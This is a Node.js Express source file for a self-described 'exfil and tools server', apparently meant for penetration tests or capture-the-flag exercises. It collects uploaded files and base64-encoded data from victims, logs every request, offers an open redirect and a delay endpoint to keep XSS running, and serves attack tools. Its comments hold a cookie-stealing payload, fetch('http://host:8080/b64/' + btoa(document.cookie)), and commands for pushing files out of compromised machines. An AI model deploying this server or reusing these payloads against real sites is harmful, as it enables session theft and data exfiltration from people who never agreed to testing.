const express = require("express");
const app = express();
const port = process.argv[2] || 8080;
const dir = process.argv[3] || process.cwd();
const upload = require("express-fileupload");
const fse = require("fs-extra");
const fs = require("fs");
const path = require("path");
const Base64 = require("js-base64").Base64;
const concat = require('concat-stream');

/*
 * Wait till we've got the full body so we can log it, unless it's multipart/form-data so
 * we don't break it.
 */
app.use(function(req, res, next){
  if (!req.url.includes('/upload')) {
    req.pipe(concat(function(data){
      req.body = data;
      next();
    }));
  } else {
    next();
  }
});

/*
 * Log headers and body of the requests to stdout
 */
app.use(function (req, res, next) {
  const date = new Date().toTimeString().split(' ')[0];
  console.log(`${date}: ${req.method} ${req.url}`);
  let logHeaders = "";
  req.rawHeaders.forEach((header, idx) => {
    if (idx % 2) {
      logHeaders += header + "\n";
    } else {
      logHeaders += "\t" + header + ": ";
    }
  });
  console.log(logHeaders);
  if (req.body) {
    console.log(req.body.toString('utf-8'));
  }
  next();
});

/*
 * For uploading multipart/form-data files
 * curl -F 'output-filename=@./path/input-file-name' http://host:8080/upload
 */
app.use(upload());
app.post("/upload", (req, res) => {
  Object.keys(req.files).forEach((key) => {
    console.log("Writing " + key);
    req.files[key].mv(path.join('/tmp', key));
  });
  res.sendStatus(200);
});

/*
 * Writes the contents of the request's body to given filename.  So you can do the following on windows:
 * Invoke-RestMethod -Uri http://host:8080/win-file/output-file-name.ext -Method Post -InFile input-file-name.ext
 */
app.all("/win-file/:filename", (req, res) => {
  fs.writeFileSync(path.join('/tmp', req.params.filename), req.body);
  res.sendStatus(200);
});

/*
 * Extract base64 from the url and write to specified file
 * /b64-file/filename?f=[b64 contents]
 */
app.all("/b64-file/*", (req, res) => {
  let b64 = /f=([a-zA-Z0-9+=]+)/.exec(req.url);
  let contents = "";
  if (b64 != null) {
    contents = Base64.decode(b64[1]);
  } else {
    return res.sendStatus(400);
  }

  console.log(contents);
  let file = req.path.replace("/b64-file", "").replace(/\.\./g, "up");
  let filePath = path.join(process.cwd(), file);

  res.sendStatus(200);
  if (contents.length > 0) {
    console.log("File: " + filePath);
    fse.ensureFileSync(filePath);
    fs.appendFileSync(filePath, contents);
  } else {
    console.log("Directory: " + filePath);
    fse.ensureDirSync(filePath);
  }
});

/*
 * Log base64 from url
 * fetch('http://host:8080/b64/' + btoa(document.cookie));
 */
app.all("/b64/*", (req, res) => {
  let b64 = /\/b64\/([a-zA-Z0-9+=]+)/.exec(req.url);
  let contents = "";
  if (b64 != null) {
    contents = Base64.decode(b64[1]);
  } else {
    return res.sendStatus(400);
  }
  console.log(contents);
  res.sendStatus(200);
});

/*
 * Serve redirect for url
 */
app.all("/redirect/*", (req,res) => {
  res.redirect(req.url.replace(/^\/redirect\//,''));
});

/*
 * Delay the specified number of seconds before responding.  Can be useful to keep a page from redirecting or closing
 * while XSS executes or similar
 */
app.all("/delay/:seconds", (req, res) => {
  setTimeout(() => req.sendStatus(200),parseInt(req.params.seconds * 1000));
});

/*
 * Serve up tools or other files
 */
app.use(express.static(dir));
app.listen(port, () => console.log(`exfil and tools server listening on port ${port}!`));
